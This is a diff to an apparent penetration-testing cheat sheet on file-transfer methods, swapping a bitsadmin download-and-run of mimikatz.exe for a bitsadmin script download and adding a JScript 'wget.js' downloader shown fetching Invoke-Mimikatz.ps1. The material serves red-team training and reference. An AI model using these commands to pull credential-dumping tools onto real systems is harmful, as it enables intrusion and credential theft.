@@ -82,12 +82,11 @@ https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 
 ## bitsadmin.exe
 
-cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://www.trustedsite.com C:\Temp\mimikatz.exe & start C:\Temp\mimikatz.exe"
+bitsadmin.exe /transfer n https://gist.githubusercontent.com/egre55/816ddb91016034dcf747f4ea5f054767/raw/69da838fdfd74811060aabfe1f66c8cd0d058daf/procmon.ps1 C:\Users\Public\Music\procmon.ps1
 
 Links: 
 
-https://www.greyhathacker.net/?tag=download-and-execute
-
+https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
 
 ## scp / pscp.exe
 
@@ -170,6 +169,26 @@ socat TCP-LISTEN:80,reuseaddr,fork
 
 wget http://10.10.10.10:80/info.txt -O /tmp/info.txt
 
+## cscript wget.js
+
+> cscript /nologo wget.js https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
+
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+WScript.Echo(WinHttpReq.ResponseText);
+
+/* To save a binary file use this code instead of previous line
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile("out.bin");
+*/
+
+Links:
+
+https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl
 
 ## curl
 
